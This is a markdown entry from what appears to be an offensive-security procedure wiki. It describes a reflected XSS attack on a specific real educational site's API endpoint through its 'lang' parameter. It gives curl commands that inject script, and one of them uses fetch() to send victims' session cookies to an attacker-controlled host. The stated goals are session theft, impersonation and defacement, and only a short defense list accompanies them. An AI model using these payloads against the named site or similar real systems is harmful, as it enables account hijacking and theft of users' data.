---
id: proc-xss-lang-injection
tags:
  - xss
  - injection
  - content-sniffing
type: procedure
tools:
  - '[[tools/Acunetix]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-xss-injection-khan]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:16:30.483Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
---
# Inject-XSS-Payload-into-Lang-Parameter

## Summary

This procedure exploits a reflected XSS vulnerability by injecting a malicious script into the 'lang' parameter of Khan Academy's API endpoint, bypassing content-sniffing to execute JavaScript for session theft and impersonation.

## Description

The target endpoint /api/internal/_mt/user/videos/VIVIegSt81k/log_compatibility processes the 'lang' parameter without proper validation, allowing HTML/JS tags to be reflected and executed due to MIME-type sniffing. In an attack scenario, a victim visits a malicious link triggering the request in their browser, leading to cookie exfiltration. Prerequisites: Identified vulnerable endpoint from scanning. Outcomes: Script execution, data theft, and page manipulation.

## Requirements

1. Access to the target API (public, no auth)
2. Tools like curl for testing or browser for execution
3. Attacker-controlled server for exfiltration (e.g., via ngrok)

## Defense

Defensive measures and detection strategies:

- Sanitize and validate all input parameters, rejecting non-language values
- Set strict MIME types (e.g., application/json) to prevent sniffing
- Log and monitor for suspicious query strings containing script tags

## Objectives

1. Inject and execute arbitrary JavaScript in victim context
2. Steal session cookies for impersonation
3. Modify displayed content to phish or deface

## Instructions

### Step 1: Craft and Send Injection Request

**Context**: Use a GET request to embed the payload in the lang parameter, simulating a victim's browser request.

**Command** ([[commands/curl-xss-injection-khan]]):
```bash
curl -G "https://www.khanacademy.org/api/internal/_mt/user/videos/VIVIegSt81k/log_compatibility" --data-urlencode "lang=en<script>alert('XSS')</script>"
```

> This sends the payload; in a real attack, embed in an <img src> or iframe to trigger in browser. Expected: Response with reflected <script> tag.

### Step 2: Verify Execution and Exfiltrate

**Context**: Modify payload for data theft and confirm via alert or callback.

**Command** ([[commands/curl-xss-injection-khan]]):
```bash
curl -G "https://www.khanacademy.org/api/internal/_mt/user/videos/VIVIegSt81k/log_compatibility" --data-urlencode "lang=en<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>"
```

> Replace with actual exfil URL. Expected: Network request to attacker server with cookies if executed in browser.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-xss-injection-khan]]

## Tools Used

- [[tools/Acunetix]]

## Tags

- [[xss]]
- [[injection]]
